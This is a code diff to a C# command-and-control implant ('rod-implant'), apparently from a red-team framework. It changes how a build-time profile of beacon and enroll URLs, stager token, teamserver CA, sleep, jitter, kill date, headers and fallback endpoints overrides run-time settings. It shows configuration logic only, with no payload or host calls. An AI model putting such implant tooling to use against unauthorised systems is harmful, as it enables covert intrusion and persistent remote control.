@@ -25,15 +25,10 @@ internal static class ImplantApp
             cts.Cancel();
         };
 
-        // A profile baked in at build time (the generated BakedProfile class) seeds
-        // the defaults; explicit flags and env still win over it, so an operator
-        // can override at run time.
-        BakedProfileSupport.SeedFromBaked();
-
         Config config;
         try
         {
-            config = Config.Parse(args);
+            config = Config.ParseWithoutValidation(args);
         }
         catch (ExitProgramException ex)
         {
@@ -42,6 +37,26 @@ internal static class ImplantApp
             // printed usage). A null message means "already reported, stay quiet".
             if (ex.Message is { Length: > 0 } msg)
                 Console.Error.WriteLine("rod-implant: " + msg);
+            return ex.ExitCode;
+        }
+
+        // The profile baked in at build time (the generated BakedProfile
+        // class) is authoritative for every operational key it carries: a
+        // fielded artifact cannot be re-pointed or re-credentialed through
+        // flags or the environment. An unbaked dev binary bakes nothing and
+        // keeps its full flag/env configuration.
+        BakedProfileSupport.ApplyBaked(config);
+
+        // The required-field check runs after the bake: a fielded artifact
+        // supplies its endpoint and credential there, and an unbaked run must
+        // present them via flags or env.
+        try
+        {
+            config.Validate();
+        }
+        catch (ExitProgramException ex)
+        {
+            Console.Error.WriteLine("rod-implant: " + ex.Message);
             return ex.ExitCode;
         }
 
@@ -289,20 +304,27 @@ internal static class Endpoints
 
 internal static class BakedProfileSupport
 {
-    // Applies the build-time baked profile as the defaults for any config field
-    // the operator did not supply via flag or env. The baked value is base64-URL
-    // JSON (the build unit writes it into the generated BakedProfile class).
-    // Malformed baked data is ignored -- a bad bake must not crash the implant, it
-    // just falls back to flag/env.
-    public static void SeedFromBaked()
+    // Applies the build-time baked profile (the generated BakedProfile
+    // class, base64-URL JSON) OVER the parsed run-time configuration: every
+    // operational key the bake carries is final, so a fielded artifact
+    // cannot be re-pointed or re-credentialed through flags or the
+    // environment -- what was built is what runs (architecture.md Sec 5.1).
+    // Keys the bake omits keep their flag/env values, so an unbaked dev
+    // binary stays fully configurable. Narration is the one deliberate
+    // exception: quiet stays env-driven, because a debugging run's
+    // ROD_QUIET=0 changes nothing about where the implant goes or what it
+    // can do. Malformed baked data is ignored whole -- a bad bake must not
+    // crash the implant, it just leaves the flag/env configuration in
+    // force.
+    public static void ApplyBaked(Config config, string? bakedJson = null)
     {
-        var bakedJson = BakedProfile.Json;
-        if (bakedJson.Length == 0)
+        var json = bakedJson ?? BakedProfile.Json;
+        if (json.Length == 0)
             return;
         string raw;
         try
         {
-            raw = DecodeBase64Url(bakedJson);
+            raw = DecodeBase64Url(json);
         }
         catch
         {
@@ -310,57 +332,108 @@ internal static class BakedProfileSupport
         }
         using var doc = System.Text.Json.JsonDocument.Parse(raw);
         var root = doc.RootElement;
-        // Map baked keys to the same ROD_* env names config.Parse reads; only set
-        // env when it is not already present, so an explicit env always wins over
-        // the bake.
-        SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
-        SetEnvIfPresent(root, "verbs", "ROD_VERBS");
-        SetEnvIfPresent(root, "mode", "ROD_MODE");
-        SetEnvIfPresent(root, "beaconURL", "ROD_BEACON_URL");
+
+        IfString(root, "enrollURL", value => config.EnrollURL = value);
+        IfString(root, "beaconURL", value => config.BeaconURL = value);
+        IfString(root, "token", value => config.StagerToken = value);
         // The pinned teamserver CA rides as the PEM text itself; the loader
         // accepts inline PEM or a file path under the same knob.
-        SetEnvIfPresent(root, "caCert", "ROD_CA_CERT");
-        SetEnvIfPresent(root, "token", "ROD_STAGER_TOKEN");
-        SetEnvIfPresent(root, "sleep", "ROD_SLEEP");
-        SetEnvIfPresent(root, "jitter", "ROD_JITTER");
-        SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
-        SetEnvIfPresent(root, "enrollPath", "ROD_ENROLL_PATH");
-        SetEnvIfPresent(root, "userAgent", "ROD_USER_AGENT");
-        SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
-        SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
-        SetEnvIfPresent(root, "envelopeKey", "ROD_ENVELOPE_KEY");
-        SetEnvIfPresent(root, "contactEnvelope", "ROD_CONTACT_ENVELOPE");
-        // The pipeline bakes quiet=true for every artifact; a debugging run
-        // presets ROD_QUIET=0 to override it (SetEnvIfPresent leaves an
-        // already-set variable untouched).
-        SetEnvIfPresent(root, "quiet", "ROD_QUIET");
-        // Headers ride as a nested object; re-emit the raw JSON verbatim into
-        // ROD_HEADERS, which config.Parse decodes back into the header map.
+        IfString(root, "caCert", value => config.CACertPath = value);
+        IfString(root, "mode", value => config.Mode = Config.NormalizeMode(value));
+        IfString(root, "verbs", value => config.ClassVerbs = Config.ParseCommaList(value));
+        IfDuration(root, "sleep", value => config.Sleep = value);
+        IfDuration(root, "jitter", value => config.Jitter = value);
+        // An empty kill date is the bake's open-ended shape and clears any
+        // run-time fuse the same way an absent one never set it.
+        IfKillDate(root, config);
+        IfString(root, "enrollPath", value => config.Transport.EnrollPath = value);
+        IfString(root, "userAgent", value => config.Transport.UserAgent = value);
+        IfDuration(root, "requestTimeout", value => config.Transport.RequestTimeout = value);
+        IfString(root, "envelope", value => config.Transport.Envelope = value);
+        IfString(root, "envelopeKey", value => config.Transport.EnvelopeKey = value);
+        IfString(root, "contactEnvelope", value => config.Transport.ContactEnvelope = value);
         if (root.TryGetProperty("headers", out var headers)
-            && headers.ValueKind == System.Text.Json.JsonValueKind.Object
-            && Environment.GetEnvironmentVariable("ROD_HEADERS") is null)
+            && headers.ValueKind == System.Text.Json.JsonValueKind.Object)
         {
-            Environment.SetEnvironmentVariable("ROD_HEADERS", headers.GetRawText());
+            config.Transport.Headers = DecodeHeaders(headers);
         }
-        // The fallback endpoint list rides as a nested array, the same verbatim
-        // pass-through (architecture.md Sec 8): ROD_FALLBACK_ENROLL_URLS decodes
-        // the JSON array back into the ordered walk.
+        // The fallback endpoint list rides as a nested array
+        // (architecture.md Sec 8): the ordered walk the egress follows when
+        // the primary burns.
         if (root.TryGetProperty("fallbackEnrollURLs", out var fallbacks)
-            && fallbacks.ValueKind == System.Text.Json.JsonValueKind.Array
-            && Environment.GetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS") is null)
+            && fallbacks.ValueKind == System.Text.Json.JsonValueKind.Array)
         {
-            Environment.SetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS", fallbacks.GetRawText());
+            config.FallbackEnrollURLs = DecodeFallbacks(fallbacks);
         }
     }
 
-    private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
+    private static void IfString(
+        System.Text.Json.JsonElement root, string key, Action<string> apply)
     {
-        if (root.TryGetProperty(jsonKey, out var value) && value.ValueKind == System.Text.Json.JsonValueKind.String)
+        if (root.TryGetProperty(key, out var value)
+            && value.ValueKind == System.Text.Json.JsonValueKind.String)
         {
             var s = value.GetString();
-            if (!string.IsNullOrEmpty(s) && Environment.GetEnvironmentVariable(envKey) is null)
-                Environment.SetEnvironmentVariable(envKey, s);
+            if (!string.IsNullOrEmpty(s))
+                apply(s);
         }
+    }
+
+    // The bake speaks the Go-duration shape the build contract defines
+    // ("30s", "5m"); an unparseable or negative value leaves the parsed
+    // configuration untouched rather than half-applying.
+    private static void IfDuration(
+        System.Text.Json.JsonElement root, string key, Action<TimeSpan> apply)
+    {
+        if (root.TryGetProperty(key, out var value)
+            && value.ValueKind == System.Text.Json.JsonValueKind.String)
+        {
+            var parsed = Config.ParseGoDuration(value.GetString() ?? "", TimeSpan.MinValue);
+            if (parsed != TimeSpan.MinValue && parsed >= TimeSpan.Zero)
+                apply(parsed);
+        }
+    }
+
+    private static void IfKillDate(System.Text.Json.JsonElement root, Config config)
+    {
+        if (!root.TryGetProperty("killDate", out var value)
+            || value.ValueKind != System.Text.Json.JsonValueKind.String)
+            return;
+        var s = value.GetString();
+        if (string.IsNullOrEmpty(s))
+        {
+            config.KillDate = DateTimeOffset.MinValue;
+            return;
+        }
+        if (DateTimeOffset.TryParse(s, System.Globalization.CultureInfo.InvariantCulture,
+                System.Globalization.DateTimeStyles.AssumeUniversal, out var parsed))
+            config.KillDate = parsed;
+    }
+
+    private static IReadOnlyList<string> DecodeFallbacks(System.Text.Json.JsonElement array)
+    {
+        var urls = new List<string>();
+        foreach (var item in array.EnumerateArray())
+        {
+            if (item.ValueKind != System.Text.Json.JsonValueKind.String)
+                continue;
+            var url = item.GetString();
+            if (!string.IsNullOrWhiteSpace(url))
+                urls.Add(url.Trim());
+        }
+        return urls;
+    }
+
+    private static Dictionary<string, string> DecodeHeaders(System.Text.Json.JsonElement obj)
+    {
+        var headers = new Dictionary<string, string>();
+        foreach (var prop in obj.EnumerateObject())
+        {
+            headers[prop.Name] = prop.Value.ValueKind == System.Text.Json.JsonValueKind.String
+                ? prop.Value.GetString() ?? string.Empty
+                : prop.Value.GetRawText();
+        }
+        return headers;
     }
 
     private static string DecodeBase64Url(string value)
